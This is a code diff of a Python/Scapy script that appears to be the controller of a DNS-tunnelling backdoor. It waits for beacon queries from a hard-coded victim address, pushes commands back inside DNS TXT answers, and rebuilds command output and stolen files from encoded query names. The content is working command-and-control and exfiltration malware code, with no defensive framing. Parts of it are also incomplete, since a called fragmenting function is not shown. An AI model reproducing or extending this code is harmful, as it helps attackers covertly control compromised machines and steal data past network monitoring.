@@ -16,11 +16,8 @@ def commands_input():
             commands_que = {key: value}   
             print(commands_que)
             
-def build_p(packet,data):
-    PKT = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNS(qd=packet[DNS].qd,rd=0,qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,type='TXT',rdata=data))
-    return PKT
 
-def send_command(ip_adr,vic_sport,get_qname,packet):
+def send_command(packet):
     global commands_que
     if not commands_que:
         return
@@ -35,10 +32,7 @@ def send_command(ip_adr,vic_sport,get_qname,packet):
         prefix = FILE
     bin_command = bytes(command_name.encode())
 	 
-    combined = prefix + bin_command
-
-    built_pkt = build_p(packet,combined)
-    send(built_pkt)
+    frag_and_send(packet,bin_command,0,0,prefix)
 
     commands_que = ""
         
@@ -46,38 +40,24 @@ def send_command(ip_adr,vic_sport,get_qname,packet):
 def parse_packet(packet):
     global opened_fd
     
-    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0: 
-        print("i am in parse")
-        victim_ip = packet[IP].src
-        if (victim_ip) != "192.168.1.21":
-            return
-        vic_sport = packet[UDP].sport
-        get_qname = packet[DNS].qd.qname
-        print("print qname:")
-        print(get_qname)   # class bytes
-        if get_qname.startswith(BEACON):
-            data_recieved = get_qname[len(BEACON)]
-            send_command(victim_ip,vic_sport,get_qname,packet)
-         
-        elif get_qname.startswith(BEGIN_OUTPUT):
-            data_recieved = get_qname[len(BEGIN_OUTPUT)]	 
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+        prefix_packet = packet[DNSQR].qname[0][:6]
+        data_recieved = packet[DNSQR].qname[0][6:]
+        if prefix_packet == BEACON:
+            send_command(packet)
+        elif prefix_packet == BEGIN_OUTPUT:
             opened_fd = open_file(LOG_OUTPUT)
-            write_to_file(opened_fd,data_recieved)  
-            
-        elif get_qname.startswith(BEGIN_FILE):
-            data_recieved = get_qname[len(BEGIN_FILE)]            
+            write_to_file(opened_fd,data_recieved)
+        elif prefix_packet == BEGIN_FILE:
             file_name = os.path.basename(data_recieved)
             opened_fd = open_file(file_name)
-            
         elif prefix_packet == IN_TRANSFER:
-            write_to_file(opened_fd,data_recieved)  # write the content to the opened fd
-            
-        elif get_qname.startswith(EF):       
+            write_to_file(opened_fd,data_recieved)
+        elif prefix_packet == EF:
             close_file(opened_fd)
             opened_fd = ""
             print("transer complete")
             
-
 def open_file(file_name):
 	flags = os.O_WRONLY|os.O_CREAT|os.O_APPEND
 	fd = os.open(file_name,flags)
